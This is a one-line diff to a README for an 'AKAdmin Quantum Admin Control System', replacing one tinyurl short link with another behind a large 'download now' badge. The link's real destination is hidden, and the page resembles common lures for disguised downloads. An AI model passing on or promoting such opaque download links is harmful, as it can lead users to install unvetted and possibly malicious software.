@@ -1,7 +1,7 @@
 # ⚡ AKAdmin: Quantum Admin Control System 2024
 
 <div align="center">
-  <a href="https://tinyurl.com/AKadmin1/">
+  <a href="https://tinyurl.com/3cfajyrf">
     <img src="https://img.shields.io/badge/⚡_DOWNLOAD_AKADMIN_V4-NOW-00FF00?style=for-the-badge&logo=lightning&logoColor=white" width="350">
   </a>
 </div>
